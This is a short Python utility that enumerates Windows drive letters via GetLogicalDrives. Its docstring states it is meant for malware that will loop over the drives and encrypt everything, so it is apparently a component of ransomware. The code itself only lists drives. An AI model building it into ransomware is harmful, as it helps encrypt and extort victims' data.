'''
This util created to get the drivers in the local system so
the malware can loop over them to actually encrypt everything
'''

from ctypes import windll

def list_drives() -> list[str]:
    drives = []
    bitmask = windll.kernel32.GetLogicalDrives()
    for letter in range(26):
        if bitmask & 1:
            drives.append(chr(65 + letter) + ":\\")
        bitmask >>= 1
    return drives